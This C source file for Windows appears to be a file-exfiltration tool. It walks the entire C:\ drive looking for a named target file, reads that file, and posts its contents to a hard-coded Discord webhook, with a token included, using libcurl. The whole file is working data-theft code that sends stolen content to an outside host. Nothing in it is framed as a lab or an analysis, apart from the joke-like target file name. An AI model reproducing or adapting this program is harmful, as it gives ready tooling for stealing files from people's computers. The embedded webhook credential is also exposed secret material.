#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <curl/curl.h>

#define WEBHOOK_URL "https://discord.com/api/webhooks/1385414574320128011/noas_w3-JL-e2yGQrHK0KU0bkqfd384NbDbFAPCm44amFz5S2u_nH8bLx4g3BcJp-T2T"
#define TARGET_FILENAME "secret_file_not_really.txt"
#define MAX_DISCORD_MSG_LEN 1900  // Leave space for JSON formatting

// Buffer struct for capturing curl response
struct string {
    char *ptr;
    size_t len;
};

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(1);
    if (s->ptr == NULL) {
        fprintf(stderr, "malloc failed\n");
        exit(EXIT_FAILURE);
    }
    s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, void *userdata) {
    struct string *s = (struct string *)userdata;
    size_t new_len = s->len + size * nmemb;
    char *new_ptr = realloc(s->ptr, new_len + 1);
    if (new_ptr == NULL) {
        fprintf(stderr, "realloc failed\n");
        return 0;
    }
    s->ptr = new_ptr;
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;

    return size * nmemb;
}

// Escape JSON special chars and limit length to MAX_DISCORD_MSG_LEN
int json_escape_limited(const char *input, char *output, size_t out_size) {
    size_t j = 0;
    for (size_t i = 0; input[i] != '\0' && j + 6 < out_size; i++) { // reserve space for escapes
        char c = input[i];
        switch (c) {
            case '\"': output[j++] = '\\'; output[j++] = '\"'; break;
            case '\\': output[j++] = '\\'; output[j++] = '\\'; break;
            case '\n': output[j++] = '\\'; output[j++] = 'n';  break;
            case '\r': output[j++] = '\\'; output[j++] = 'r';  break;
            case '\t': output[j++] = '\\'; output[j++] = 't';  break;
            default:
                if ((unsigned char)c < 32) {
                    output[j++] = ' ';
                } else {
                    output[j++] = c;
                }
        }
        if (j >= MAX_DISCORD_MSG_LEN) break; // stop if max length reached
    }
    output[j] = '\0';
    return 0;
}

int send_to_discord(const char *content) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl init failed\n");
        return 1;
    }

    char escaped[MAX_DISCORD_MSG_LEN * 2] = {0};
    json_escape_limited(content, escaped, sizeof(escaped));

    char json[16384];
    snprintf(json, sizeof(json), "{\"content\":\"%s\"}", escaped);

    printf("[DEBUG] JSON Payload:\n%s\n", json);  // debug print payload

    struct string response;
    init_string(&response);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl failed: %s\n", curl_easy_strerror(res));
        free(response.ptr);
        return 1;
    }

    printf("[*] HTTP status code: %ld\n", http_code);
    printf("[*] Discord response: %s\n", response.ptr);

    if (http_code < 200 || http_code >= 300) {
        fprintf(stderr, "[!] Discord API returned HTTP error %ld\n", http_code);
        free(response.ptr);
        return 1;
    }

    if (strstr(response.ptr, "\"code\":50006") != NULL) {
        fprintf(stderr, "[!] Discord API error: message cannot be empty (code 50006)\n");
        free(response.ptr);
        return 1;
    }

    free(response.ptr);
    printf("[*] Content sent successfully to Discord webhook\n");
    return 0;
}

char *read_file(const char *filepath) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    char *buffer = malloc(size + 1);
    if (!buffer) {
        fclose(f);
        return NULL;
    }

    fread(buffer, 1, size, f);
    fclose(f);
    buffer[size] = '\0';
    return buffer;
}

int find_file_recursive(const char *base_path, char *found_path, size_t found_path_len) {
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char sPath[2048];

    snprintf(sPath, sizeof(sPath), "%s\\*", base_path);

    hFind = FindFirstFile(sPath, &fdFile);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (strcmp(fdFile.cFileName, ".") == 0 || strcmp(fdFile.cFileName, "..") == 0)
            continue;

        snprintf(sPath, sizeof(sPath), "%s\\%s", base_path, fdFile.cFileName);

        if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (find_file_recursive(sPath, found_path, found_path_len))
                return 1;
        } else {
            if (_stricmp(fdFile.cFileName, TARGET_FILENAME) == 0) {
                strncpy(found_path, sPath, found_path_len);
                return 1;
            }
        }
    } while (FindNextFile(hFind, &fdFile));

    FindClose(hFind);
    return 0;
}

int main() {
    char found_path[2048];
    int found = find_file_recursive("C:\\", found_path, sizeof(found_path));

    if (found) {
        printf("File found at: %s\n", found_path);
        char *content = read_file(found_path);
        if (!content) {
            fprintf(stderr, "Failed to read found file\n");
            send_to_discord("ERROR: Found file but could not read contents");
            return 1;
        }
        printf("[*] File content length: %zu\n", strlen(content));
        printf("[*] First 100 chars of content:\n%.100s\n", content);
        if (send_to_discord(content) != 0) {
            fprintf(stderr, "Failed to send file content to Discord\n");
            free(content);
            return 1;
        }
        free(content);
    } else {
        printf("File NOT FOUND\n");
        if (send_to_discord("NOT FOUND") != 0) {
            fprintf(stderr, "Failed to send NOT FOUND message to Discord\n");
            return 1;
        }
    }

    printf("[*] Program completed\n");
    return 0;
}
